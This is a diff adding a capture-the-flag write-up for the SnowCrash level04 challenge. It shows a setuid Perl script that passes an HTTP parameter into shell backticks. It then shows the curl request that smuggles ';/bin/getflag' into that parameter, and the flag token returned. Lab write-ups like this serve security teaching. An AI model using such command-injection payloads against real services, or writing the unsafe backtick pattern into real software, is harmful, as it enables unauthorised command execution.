@@ -1,0 +1,29 @@
+# in this level we have a perl script which prints an HTTP parameter's value whose key is 'x'
+
+level04@SnowCrash:~$ ls -l level04.pl 
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+level04@SnowCrash:~$ file level04.pl 
+level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
+
+# it's a SETUID which means it'll execute with flag04's privileges which can run /bin/getflag and get the flag
+
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+# "print `echo $y 2>&1`" this line is dangerously vulnerable, since it can be easily targeted by 'Shell injection'
+# in the query of the URL if we add x='value', value will be concatenated with echo in "print `echo $y 2>&1`" and will be executed
+# what if the value is ';/bin/getflag'? after concatenation the command becomes: echo ;/bin/getflag which executes /bin/getflag with flag04 privileges
+# but we replace ; with %3B (the URL-encoded form of ;)
+
+# running curl:
+level04@SnowCrash:~$ curl "http://localhost:4747?x=%3B/bin/getflag"
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+level04@SnowCrash:~$ su level05
+Password: 
+level05@SnowCrash:~$
+
+# level05 unlocked
